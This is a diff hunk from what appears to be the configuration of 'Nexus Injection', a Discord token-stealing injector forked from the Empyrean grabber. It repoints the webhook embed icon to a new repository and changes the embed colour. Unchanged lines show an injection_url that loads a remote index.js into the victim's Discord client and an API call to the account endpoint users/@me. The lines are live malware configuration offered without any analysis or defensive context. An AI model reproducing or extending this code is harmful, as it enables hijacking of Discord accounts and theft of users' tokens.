@@ -12,8 +12,8 @@ const config = {
   ping_on_run: false, 
   ping_val: '@everyone', 
   embed_name: 'Nexus Injection', 
-  embed_icon: 'https://raw.githubusercontent.com/addi00000/empyrean-injection/main/imgs/pfp.png', 
-  embed_color: 0, 
+  embed_icon: 'https://raw.githubusercontent.com/NexusTestGithub/injection/main/RmDJt7xVhNFTA6yvy3EWfsTbki45EeI67K93h75F.png', 
+  embed_color: 13574896, 
   injection_url: 'https://raw.githubusercontent.com/NexusTestGithub/injection/main/index.js', 
 
   api: 'https://discord.com/api/v9/users/@me',
